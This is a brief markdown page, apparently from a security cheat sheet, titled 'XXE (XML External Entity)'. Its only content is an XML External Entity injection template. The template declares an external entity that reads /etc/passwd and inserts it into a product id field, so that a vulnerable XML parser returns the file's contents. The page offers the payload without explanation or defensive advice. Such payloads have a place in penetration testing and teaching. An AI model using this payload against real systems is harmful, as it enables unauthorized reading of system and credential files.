---
title: "XXE (XML External Entity)"
date: 2024-7-5
tags: ["xxe", "xml", "dtd", "web"]
---

---
### XXE Template

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY data SYSTEM "/etc/passwd">]>
<product>
    <id>&data;</id>
    <price></price>
</product>
```

<br>